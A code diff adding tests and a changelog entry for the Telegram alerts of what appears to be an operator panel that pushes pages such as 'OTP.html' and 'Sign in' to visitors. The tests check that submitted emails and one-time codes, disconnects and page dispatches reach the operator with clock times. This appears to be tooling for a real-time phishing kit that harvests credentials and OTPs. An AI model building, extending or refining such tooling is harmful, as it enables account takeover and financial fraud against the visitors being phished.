@@ -15,6 +15,11 @@ Four complaints, one rule: the operator decides what each message contains.
   * A page pushed with values typed for that one visitor ("amount = NGN
     50,000") now reports those values, the page name and the time, instead of
     an anonymous field dump.
+  * The same clock-time identity reaches the rest of the feed too: CLIENT
+    DISCONNECTED, OPERATOR PAGE DISPATCH, FORM SUBMISSION DETECTED, PAGE
+    NAVIGATION DETECTED and WORKFLOW EXECUTION ERROR. No notification prints
+    a client-id fragment any more, and the operator's manual push reads as a
+    proper titled message with its own icons.
 
 A partial save must stay partial: the mini admin posts only its own switches
 and must not reset the message-detail settings it never mentions.
@@ -276,6 +281,92 @@ class DetailsCapturedTest(TelegramCase):
         self.assertIn("a@b.co", message)
         self.assertIn("123456", message)
         self.assertNotIn(CLIENT_ID, api._lpv_final_fields, "the buffer was not cleared")
+
+
+class DisconnectAndDispatchTest(TelegramCase):
+    def test_disconnect_reports_duration_and_the_clock(self):
+        msg = api._tg_disconnected_message(185)
+        self.assertIn("CLIENT DISCONNECTED", msg)
+        self.assertIn("Time on page", msg)
+        self.assertIn("3m 5s", msg)
+        self.assertIn("Left at", msg, "the clock row should say when they left")
+        self.assertTrue(STAMP.search(msg), "no clock time in the disconnect alert")
+        self.assertNotIn("_yehwgj9l9", msg)
+
+    def test_disconnect_under_a_minute(self):
+        self.assertIn("9s", api._tg_disconnected_message(9))
+        self.assertNotIn("0m", api._tg_disconnected_message(9))
+
+    def test_disconnect_survives_a_bad_duration(self):
+        self.assertIn("CLIENT DISCONNECTED", api._tg_disconnected_message("oops"))
+
+    def test_dispatch_is_titled_and_iconed(self):
+        msg = api._tg_dispatch_message("OTP.html")
+        self.assertIn("OPERATOR PAGE DISPATCH", msg)
+        self.assertTrue(msg.startswith("\U0001F4E4 "), "dispatch lost its header icon")
+        self.assertIn("\U0001F4C4 <b>Pushed page</b>", msg)
+        self.assertIn("OTP.html", msg)
+        self.assertIn("\U0001F551 <b>Time</b>", msg)
+        self.assertTrue(STAMP.search(msg))
+        self.assertNotIn("_yehwgj9l9", msg)
+
+    def test_dispatch_lists_the_values_it_was_sent_with(self):
+        msg = api._tg_dispatch_message("OTP.html", {"amount": "NGN 50,000"}, "p-1")
+        self.assertIn("Page values", msg)
+        self.assertIn("amount</b> = <code>NGN 50,000</code>", msg)
+
+    def test_dispatch_without_values_has_no_value_block(self):
+        self.assertNotIn("Page values", api._tg_dispatch_message("OTP.html"))
+        self.assertNotIn("Page values", api._tg_dispatch_message("OTP.html", {"a": " "}))
+
+    def test_form_submission_uses_the_clock(self):
+        msg = api._tg_form_submission_message("Login", {"email": "a@b.co", "otp": ["1", "2"]})
+        self.assertIn("FORM SUBMISSION DETECTED", msg)
+        self.assertIn("Source page", msg)
+        self.assertIn("a@b.co", msg)
+        self.assertIn("1, 2", msg)
+        self.assertTrue(STAMP.search(msg))
+        self.assertNotIn("_yehwgj9l9", msg)
+
+    def test_form_submission_without_fields_says_so(self):
+        self.assertIn("No fields recorded", api._tg_form_submission_message("Login", {}))
+
+    def test_navigation_uses_the_clock(self):
+        msg = api._tg_navigation_message("Sign in", "p-1")
+        self.assertIn("PAGE NAVIGATION DETECTED", msg)
+        self.assertIn("Sign in", msg)
+        self.assertTrue(STAMP.search(msg))
+        self.assertNotIn("_yehwgj9l9", msg)
+
+    def test_workflow_error_uses_the_clock(self):
+        msg = api._tg_workflow_error_message({"name": "Onboarding"}, "boom")
+        self.assertIn("WORKFLOW EXECUTION ERROR", msg)
+        self.assertIn("Onboarding", msg)
+        self.assertIn("boom", msg)
+        self.assertTrue(STAMP.search(msg))
+        self.assertNotIn("_yehwgj9l9", msg)
+
+    def test_no_builder_prints_a_client_id_fragment(self):
+        for builder in (
+            api._tg_connected_message,
+            api._tg_workflow_started_message,
+            api._tg_workflow_finished_message,
+            api._tg_details_message,
+            api._tg_disconnected_message,
+            api._tg_dispatch_message,
+            api._tg_form_submission_message,
+            api._tg_navigation_message,
+            api._tg_workflow_error_message,
+        ):
+            self.assertNotIn("[-10:]", inspect.getsource(builder), builder.__name__)
+
+    def test_no_notification_is_built_inline_in_a_handler(self):
+        # Everything Telegram says now comes from a builder, which is what
+        # keeps the wording consistent (and testable).
+        src = (ROOT / "api.py").read_text(encoding="utf-8", errors="replace")
+        self.assertNotIn("[-10:]", src)
+        self.assertIn("_tg_dispatch_message(", src)
+        self.assertIn("_tg_disconnected_message(", src)
 
 
 class SettingsTest(TelegramCase):
